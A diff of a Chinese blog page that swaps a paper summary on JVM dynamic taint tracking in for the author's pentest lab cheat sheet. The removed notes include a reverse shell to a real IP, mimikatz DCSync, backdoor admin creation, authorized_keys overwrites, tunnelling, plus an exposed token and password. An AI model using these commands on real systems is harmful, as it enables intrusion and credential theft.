@@ -11,7 +11,7 @@
   <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-  <title>打靶笔记 | Godown_blog</title>
+  <title>Dynamic Taint Tracking for Modern Java Virtual Machines | Godown_blog</title>
 
   <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
   <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
@@ -591,14 +591,14 @@
 
 
 <div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
-  background-position: center center;position: relative;background-image:url('https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8168.jpg')">
+  background-position: center center;position: relative;background-image:url('https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8180.png')">
   <div class="post-detail-header-mask"></div>
   <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
   
   <div class="post-detail-header_info-box">
     <div class="title-box">
       <span class="title">
-        打靶笔记
+        Dynamic Taint Tracking for Modern Java Virtual Machines
       </span>
     </div>
     
@@ -619,92 +619,222 @@
   <div class="main-content">
     <article class="post post-detail">
       <div class="post-content">
-        <ul>
-<li>春秋云境——Tsclient</li>
-<li>思考flag2中除了传cs马进程注入，有无其他方式（RDP？）</li>
-<li>cs常见命令用法</li>
-<li>修改注册表映像劫持有哪些利用方式</li>
-<li>哈希传递登录的不同方式（不同工具的区别、利用前提，不同操作系统如何哈希传递）</li>
-</ul>
-<ol>
-<li>mimikatz+sharptoken&#x2F;msf</li>
-</ol>
-<p>另外应该cs注入svchost守护进程，才会自启动cs shell，其他进程注入后不会自启动</p>
-<ol>
-<li>Cs 有。。命令吗(°ー°〃)暂时先只记shell connect，用到哪些再加</li>
-</ol>
-<p>4.劫持改为粘滞键，notepad,calc等触发cmd</p>
-<p>默认是只有管理员和local system有权读写修改。</p>
-<p>IFEO实际上是Windows的一项正常功能，主要用于调试程序，其初衷是在程序启动的时候开启调试器来调试程序，这样一来可以在调试器中观察程序在难以重现的环境中的行为。例如，某个程序在随用户登录自动启动时会出错，但在登录后手动启动时却一切正常，这就可以通过IFEO设置一个调试器，无论程序何时启动，都会开启这个调试器对其进行调试，以便找出问题。</p>
-<p>win+R输入regedit以管理员身份运行打开<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%B3%A8%E5%86%8C%E8%A1%A8&spm=1001.2101.3001.7020">注册表</a>编辑器，并找到HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options就是保存IFEO设置的地方</p>
-<p>5.impacket的smbexec&#x2F;wmiexec，crackmapexec，msf的exploit&#x2F;windows&#x2F;smb&#x2F;psexec </p>
-<p>额外看了cs不出网横向</p>
-<p>话说cs能直接配置代理转发，不用上gost了</p>
-<p>不出网正向连接需要用beacon TCP listener，然后生成的exe上线后在1的shell里用connect去连接</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">connect 10.10.10.2 2222</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<p>java代审sink插件<a target="_blank" rel="noopener" href="https://github.com/SpringKill-team/CodeAuditAssistant">https://github.com/SpringKill-team/CodeAuditAssistant</a></p>
-<p>打开是空白的话需要授权，授权完需要重启idea</p>
-<h2 id="其他的问题"><a href="#其他的问题" class="headerlink" title="其他的问题"></a>其他的问题</h2><p>cs server挂在vps，记得vps开放50050端口</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250822174139381.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250822174139381.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250822174139381"></p>
-<p>cs用这个shell免杀比较新<a target="_blank" rel="noopener" href="https://github.com/D13Xian/CobaltStrike-KunKun">https://github.com/D13Xian/CobaltStrike-KunKun</a></p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250822192818100.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250822192818100.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250822192818100"></p>
-<p>因为要jdk&gt;&#x3D;11，用这个切环境变量很爽<a target="_blank" rel="noopener" href="https://github.com/zhangqi-ulua/JavaEnvironmentVariablesManager/releases/tag/1.0">https://github.com/zhangqi-ulua/JavaEnvironmentVariablesManager/releases/tag/1.0</a></p>
-<h2 id="打靶快捷"><a href="#打靶快捷" class="headerlink" title="打靶快捷"></a>打靶快捷</h2><p>tar -xzvf file.tar.gz</p>
-<p>find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</p>
-<p>vps 117.72.74.197</p>
-<p>花生壳 115.236.153.174</p>
-<p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;115.236.153.170&#x2F;28998 0&gt;&amp;1</p>
-<p>mimikatz dump密码：mimikatz.exe “lsadump::dcsync &#x2F;domain:xiaorang.lab &#x2F;all &#x2F;csv” exit</p>
-<p>bloodhound自己的zip有自己的SharpHound，连续收集两次拖进去（信息全一点</p>
-<p>本地adminstrators 用SharpHound抓不到，nt system才能抓到，可以甜土豆提权提到system</p>
-<h3 id="gost-代理"><a href="#gost-代理" class="headerlink" title="gost 代理"></a>gost 代理</h3><p>gost -L socks5:&#x2F;&#x2F;:5555?bind&#x3D;true</p>
-<p>gost -L rtcp:&#x2F;&#x2F;:2222&#x2F;172.22.13.28:22 -F socks5:&#x2F;&#x2F;172.22.13.28:5555</p>
-<h3 id="windows添加管理员用户"><a href="#windows添加管理员用户" class="headerlink" title="windows添加管理员用户"></a>windows添加管理员用户</h3><p>net user godown qwerQ!1234 &#x2F;add</p>
-<p>net localgroup administrators godown &#x2F;add</p>
-<p>（work win qwerq!1234)</p>
-<h3 id="python转交互式shell"><a href="#python转交互式shell" class="headerlink" title="python转交互式shell"></a>python转交互式shell</h3><p>python3 -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’</p>
-<h3 id="写ssh目录"><a href="#写ssh目录" class="headerlink" title="写ssh目录"></a>写ssh目录</h3><p>(轻薄本ssh)</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAgEAyMKDIbTdKecWjhOxfm/C6bkR8WuABeqUAacyD8DJGfA7UaKQbvIZxagSrQ7X+jOPJYDwoe3HKoG0uH987EmsHMS1FLYgHIrGzinvta4AlMFCS3r8OF/49iGvcZnqxD5UNd9DRBlu4jIu6FDl+lYyebFDfjCoRn2hcin8oxXNLbo1X95B6xqaokrnFz9H57GzrqfwN6lVy46ophmtmcLqlIIMByt2wxEdaVFWrxHYVNmvMUfHOg9KJ+aqKmPIbLLSSknAeW7YOB1o86wq36vUv5nYQqol1mAlCtYYSJrNd2RRN43ikRqbQb4l5h1S1GJmYQ8hMJWhlia19waYGiSutKBjpVggEKS00Btku5xwStOraCOJqDiSNTQw//XjL/0oCeZtsrCLmPblgeLg1i7QBrTif3jQ+3UNC1DWj7+NXdmaEAeLWH1vVu7K0JzN3yMKM9ywoZQClGVv6F+aHS5HwxjKdCQPy86eG+rSmOy+RgpYjX4leqg3sb2a4Ys9oNt7/bQChABxnGfi8l48Su+nQhW1orks9sdZM9qhem90fkpqFDxt1pv6Q8J8C+8kIjXg/FmZ4qp8+d8InDqhhNbDLdAkQX1o9Iocg2XHSAtDNUHUZtNCT2AcmAH61qGkOHAe6dvXEVA9HRxF5oElnyAQ87z4Hbo2wW7CCPBbXNkjQIk= rsa 4096-20250810&quot;</span> &gt; /root/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
-
-<p>(台式ssh)</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAzRv4K8C0ZKo/drmS5N3aJomFllWRGLoA7zQoXtePoLjg6dt2UHn6XQdwMpQkf82xYXrBBcXmaiYq377AOcTIhfTNc24u//27+fUwqSkrmGKIYYK2yZCIqWEbRySFj2FM/JJFOUKg7dYhWPQSR2IRGpPa6/a6vKta2LEcWvPFuUxw89oxP2AJLL6IQhw2yNNCz7X6AezByD+MljGTmA/tOmZJNJh95zMd71WJGjY9tXPCh/DilBumlG1lbBAC8GwscRR9jE6k24A2DIim7YWxUp0rXnWf+s1IM6YIO9ZDETCGVvHIFVl+tY50soC2CVTRqVQ4IPVQlBidCZy01PcqYQ==&quot;</span> &gt; /root/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="proxychains4"><a href="#proxychains4" class="headerlink" title="proxychains4"></a>proxychains4</h3><p>sudo vi &#x2F;etc&#x2F;proxychains4.conf</p>
-<p>socks5 192.168.1.100 1080</p>
-<p>clash开TUN代理上google很丝滑</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250829102509956.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250829102509956.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250829102509956"></p>
-<p>vim清空：:%d</p>
-<p>windows nc 要用 nc64 -lvp 19998</p>
-<h3 id="其他记录"><a href="#其他记录" class="headerlink" title="其他记录"></a>其他记录</h3><p>云镜自动签到脚本，token储存在本地浏览器（什么cookie hh?），只要在浏览器不点退出登录，token就能一直使用，写个计划任务每天上午下午签到顺便刷新token的有效期</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;正在使用 token 进行签到...&quot;</span></span><br><span class="line">sign_in_response=$(curl -i <span class="string">&#x27;https://apicloud.ichunqiu.com/student/user/sign_in&#x27;</span> \</span><br><span class="line">  -X POST \</span><br><span class="line">  -H <span class="string">&#x27;Host: apicloud.ichunqiu.com&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;Accept: application/json, text/plain, */*&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;Accept-Encoding: gzip, deflate, br&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;Sign: 28af30d38da5cb0511528a321ff80c3d22f9469e&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;Origin: https://yunjing.ichunqiu.com&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;Referer: https://yunjing.ichunqiu.com/&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;Connection: keep-alive&#x27;</span> \</span><br><span class="line">  --data-raw <span class="string">&quot;&#123;\&quot;stamp\&quot;:xxxx,\&quot;token\&quot;:\&quot;s:17e8158d3d3b3e355a94f1c927beeebc\&quot;,\&quot;rs\&quot;:\&quot;afff5c3e21619d27731d39fe5c03256f\&quot;&#125;&quot;</span> \</span><br><span class="line">  --compressed)</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;签到响应: <span class="variable">$sign_in_response</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 写日志</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;====== <span class="subst">$(date)</span> ======&quot;</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;获取 token 时间戳: <span class="variable">$current_timestamp</span>&quot;</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;获取 token 响应: <span class="variable">$token_response</span>&quot;</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;签到时间戳: <span class="variable">$new_timestamp</span>&quot;</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;签到响应: <span class="variable">$sign_in_response</span>&quot;</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;=====================&quot;</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line">&#125; &gt;&gt; /var/log/send_request.log</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="msf笔记"><a href="#msf笔记" class="headerlink" title="msf笔记"></a>msf笔记</h2><p>先Nmap或者arp-scan扫端口，根据端口攻击。如果开了web端口，就想办法rce反弹shell。拿到shell后扫一下内网，目前只会ping扫，或者升msf，用msf的scan exp扫。然后在靶机上download venom客户端用以代理，在攻击机起服务端，socks通道打通后，更改proxychains4.conf（配置文件，名字可能不一样），实现攻击机的全局代理，然后带上Proxychains nmap扫内网靶机端口</p>
+        <h3 id="Dynamic-Taint-Tracking-for-Modern-Java-Virtual-Machines"><a href="#Dynamic-Taint-Tracking-for-Modern-Java-Virtual-Machines" class="headerlink" title="Dynamic Taint Tracking for Modern Java Virtual Machines"></a><a target="_blank" rel="noopener" href="https://dl.acm.org/doi/abs/10.1145/3729349">Dynamic Taint Tracking for Modern Java Virtual Machines</a></h3><p>科研🦆🍐很大，2025 ACM顶刊污点分析拜读</p>
+<h2 id="影子存储与镜像存储"><a href="#影子存储与镜像存储" class="headerlink" title="影子存储与镜像存储"></a>影子存储与镜像存储</h2><p>镜像存储：把变量导入到另一个函数模拟执行操作</p>
 <blockquote>
-<p>如果靶机打着无回显了，应该是靶机命令还没执行完，比如ping扫内网，命令还没执行完，在shell退了sessions，或者单纯的用ctrl+c，在靶机上命令是还会继续执行的，就导致了后续命令执行不了。这种情况再杀掉session重新打时，之前在靶机上的shell还在，就会发生如下情况：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[-] Command shell session 3 is not valid and will be closed</span><br><span class="line">[*] 192.168.137.129 - Command shell session 3 closed.</span><br></pre></td></tr></table></figure>
-
-<p>可以把靶机重启，但是要重复许多步骤，最好不要杀掉sessions,进入之前没执行完命令的sessions，然后发送远程ctrl+c</p>
+<p><strong>不直接修改</strong>原始程序的栈帧、方法签名或类结构。</p>
+<p>通过一个<strong>独立的、并行的系统</strong>（例如，在另一个线程或一个全局的数据结构中）来“镜像”或映射原始程序的状态，并在这个独立的系统中维护和传播污点标签。</p>
+<ul>
+<li><strong>优点：侵入性弱，更稳健</strong></li>
+<li>因为对原始代码的修改较少，所以应用程序的正常行为受影响较小，更不容易崩溃，更加稳健。</li>
+<li><strong>缺点：可能不够精确</strong></li>
+<li>由于污点跟踪逻辑与程序主逻辑是“分离”的，它可能无法完美地捕捉到所有细微的运行时状态，导致污点传播的精确性下降（例如，在某些复杂控制流下可能丢失标签）。</li>
+</ul>
 </blockquote>
+<p>镜像存储的插桩后伪代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 全局的污点映射表</span></span><br><span class="line">Map&lt;Object, Boolean&gt; taintMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">processData</span><span class="params">(<span class="type">int</span> sensitive, <span class="type">int</span> normal)</span> &#123;</span><br><span class="line">    <span class="comment">// 在独立的&quot;镜像&quot;系统中记录操作</span></span><br><span class="line">    TaintTracker.recordMethodEntry(<span class="string">&quot;processData&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 记录参数污点状态</span></span><br><span class="line">    TaintTracker.recordParameter(<span class="number">0</span>, sensitive); <span class="comment">// 参数0 = sensitive</span></span><br><span class="line">    TaintTracker.recordParameter(<span class="number">1</span>, normal);    <span class="comment">// 参数1 = normal</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 执行原始操作</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> sensitive + normal;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 在镜像系统中执行污点传播</span></span><br><span class="line">    TaintTracker.recordBinaryOperation(<span class="string">&quot;IADD&quot;</span>, sensitive, normal, result);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 根据污点规则计算结果的污点状态</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">s_sensitive</span> <span class="operator">=</span> TaintTracker.getTaint(sensitive);</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">s_normal</span> <span class="operator">=</span> TaintTracker.getTaint(normal);</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">s_result</span> <span class="operator">=</span> s_sensitive || s_normal;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 在镜像中存储结果的污点标签</span></span><br><span class="line">    TaintTracker.setTaint(result, s_result);</span><br><span class="line">    </span><br><span class="line">    TaintTracker.recordMethodExit(<span class="string">&quot;processData&quot;</span>, result);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// TaintTracker 类的简化实现</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TaintTracker</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> Map&lt;Object, Boolean&gt; valueTaints = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">static</span> Stack&lt;OperationContext&gt; contextStack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">recordMethodEntry</span><span class="params">(String methodName)</span> &#123;</span><br><span class="line">        contextStack.push(<span class="keyword">new</span> <span class="title class_">OperationContext</span>(methodName));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">recordParameter</span><span class="params">(<span class="type">int</span> index, Object value)</span> &#123;</span><br><span class="line">        <span class="comment">// 记录参数值与其污点状态的映射</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">recordBinaryOperation</span><span class="params">(String op, Object left, Object right, Object result)</span> &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">taintLeft</span> <span class="operator">=</span> getTaint(left);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">taintRight</span> <span class="operator">=</span> getTaint(right);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">taintResult</span> <span class="operator">=</span> taintLeft || taintRight; <span class="comment">// 传播规则</span></span><br><span class="line">        setTaint(result, taintResult);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">getTaint</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> valueTaints.getOrDefault(value, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setTaint</span><span class="params">(Object value, <span class="type">boolean</span> taint)</span> &#123;</span><br><span class="line">        valueTaints.put(value, taint);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>影子存储：为每一个原始数据都创建一个并行的“影子”来存储其污点标签。dicksuck描述：</p>
+<blockquote>
+<h4 id="1-如何存储标签？"><a href="#1-如何存储标签？" class="headerlink" title="1. 如何存储标签？"></a>1. 如何存储标签？</h4><ul>
+<li><strong>局部变量</strong>：在同一个栈帧中，为每个原始局部变量创建一个新的“影子局部变量”来存储其污点标签。</li>
+<li><strong>操作数栈</strong>：修改操作数栈，使得每个原始操作数旁边都紧挨着存储其对应的“影子操作数”（即标签）。</li>
+<li><strong>字段</strong>：为每个类的原始字段添加一个“影子字段”。</li>
+<li><strong>数组</strong>：用一个新的包装对象替换原始数组，这个包装对象内部既存储原始数组，也存储每个数组元素和数组长度的污点标签。</li>
+</ul>
+<h4 id="2-如何传递标签？"><a href="#2-如何传递标签？" class="headerlink" title="2. 如何传递标签？"></a>2. 如何传递标签？</h4><ul>
+<li>为每个原始方法创建一个对应的“影子方法”。</li>
+<li>影子方法的参数列表是原始参数列表加上对应的“影子参数”（用于传入每个参数的污点标签）。</li>
+<li>如果方法有返回值，还会额外添加一个影子参数，用于<strong>传出</strong>返回值的污点标签。</li>
+<li>程序中的所有方法调用都被替换为对相应影子方法的调用。</li>
+</ul>
+<h4 id="3-如何传播标签？"><a href="#3-如何传播标签？" class="headerlink" title="3. 如何传播标签？"></a>3. 如何传播标签？</h4><ul>
+<li>将计算和传播污点标签的逻辑<strong>直接插入</strong>到原始方法体的字节码中。</li>
+<li>标签的运算和原始程序的逻辑在<strong>同一个方法调用、同一个栈帧</strong>中执行。</li>
+</ul>
+<h4 id="影子存储的优缺点"><a href="#影子存储的优缺点" class="headerlink" title="影子存储的优缺点"></a>影子存储的优缺点</h4><ul>
+<li><strong>优点：精确性高</strong></li>
+<li>因为污点数据的存储和运算与原始程序保持完全同步（在同一个栈帧、同一逻辑流中），所以它能非常精确地模拟 JVM 的运行时语义，污点传播的结果很准确。</li>
+<li><strong>缺点：侵入性强，可能导致问题</strong></li>
+<li><strong>“侵入性”</strong> 指的是它对原始程序的字节码修改非常深、范围非常广（改变了栈结构、方法签名、类结构等）。</li>
+<li>这种深度的修改可能导致应用程序的<strong>行为与正常运行时不一致</strong>，比如引发意外的崩溃或兼容性问题。文中提到，其他研究和他们自己的评估都观察到了这种现象。</li>
+</ul>
+</blockquote>
+<p>影子存储插桩后的伪代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 影子方法 - 添加了影子参数来传递污点标签</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">processData_shadow</span><span class="params">(</span></span><br><span class="line"><span class="params">    <span class="type">int</span> sensitive,       // 原始参数</span></span><br><span class="line"><span class="params">    <span class="type">boolean</span> s_sensitive, // sensitive的影子参数（污点标签）</span></span><br><span class="line"><span class="params">    <span class="type">int</span> normal,          // 原始参数  </span></span><br><span class="line"><span class="params">    <span class="type">boolean</span> s_normal,    // normal的影子参数（污点标签）</span></span><br><span class="line"><span class="params">    <span class="type">boolean</span>[] s_return   // 返回值的影子参数（传出）</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">    <span class="comment">// 影子局部变量</span></span><br><span class="line">    <span class="type">boolean</span> s_result;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 加载原始值和对应的影子标签</span></span><br><span class="line">    <span class="comment">// LOAD sensitive, s_sensitive</span></span><br><span class="line">    <span class="comment">// LOAD normal, s_normal</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 执行原始操作：加法</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> sensitive + normal;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 污点传播逻辑：如果任一操作数被污染，结果也被污染</span></span><br><span class="line">    s_result = s_sensitive || s_normal;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 存储返回值的污点标签</span></span><br><span class="line">    s_return[<span class="number">0</span>] = s_result;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用处的插桩</span></span><br><span class="line"><span class="comment">// 原始调用：processData(x, y)</span></span><br><span class="line"><span class="comment">// 变为：</span></span><br><span class="line"><span class="type">boolean</span>[] return_taint = <span class="keyword">new</span> <span class="title class_">boolean</span>[<span class="number">1</span>];</span><br><span class="line"><span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> processData_shadow(x, taint_x, y, taint_y, return_taint);</span><br><span class="line"><span class="type">boolean</span> <span class="variable">result_taint</span> <span class="operator">=</span> return_taint[<span class="number">0</span>];</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li><strong>影子存储的“长”</strong>：<strong>精确性</strong>。因为污点标签的存储和传播与原始程序逻辑在同一个栈帧、同一方法体中同步进行，能完美匹配JVM语义。</li>
+<li><strong>影子存储的“短”</strong>：<strong>侵入性过强</strong>。修改方法签名、用包装器包裹数组等操作，极易导致程序行为异常或崩溃，尤其是在面对现代Java特性（如模块系统、原生方法）时。</li>
+<li><strong>镜像存储的“长”</strong>：<strong>稳健性</strong>。不改变原始程序的结构，只是在一个平行的“镜像空间”中模拟执行，因此对程序正常行为影响小。</li>
+<li><strong>镜像存储的“短”</strong>：<strong>不精确</strong>。由于污点逻辑与程序逻辑分离，难以精确模拟所有JVM语义，且容易因JVM的“上行调用”导致污点标签传递错位。</li>
+</ul>
+<h2 id="Gelette设计架构"><a href="#Gelette设计架构" class="headerlink" title="Gelette设计架构"></a>Gelette设计架构</h2><h3 id="操作数栈的处理"><a href="#操作数栈的处理" class="headerlink" title="操作数栈的处理"></a>操作数栈的处理</h3><p>采用影子存储，但是从紧挨的影子栈变成对称影子栈</p>
+<p>传统影子存储会修改操作数栈的结构，使其每个原始值下面紧挨着存储其标签。这非常复杂且容易出错（例如，处理<code>DUP2_X2</code>这样的指令时会生成大量代码，可能超出方法体积限制）。</p>
+<p>Galette将影子操作数栈存储在方法的局部变量表中。</p>
+<p>它将局部变量表的后半部分开辟为“影子栈”的空间。这后半部分就作为栈，影子栈的“栈顶”始终位于局部变量表的最后一个索引位置。当原始程序对操作数栈进行压栈、出栈等操作时，Galette的插桩代码会在影子栈的对应区域执行完全相同的操作，只不过操作的对象是污点标签。</p>
+<p>原来需要顺序执行的栈操作，现在对称执行就行了</p>
+<h3 id="字段处理"><a href="#字段处理" class="headerlink" title="字段处理"></a>字段处理</h3><p>采用传统影子存储</p>
+<p>为每个原始字段添加一个对应的“影子字段”（例如，字段<code>count</code>对应的影子字段是<code>count$$Tag</code>）。</p>
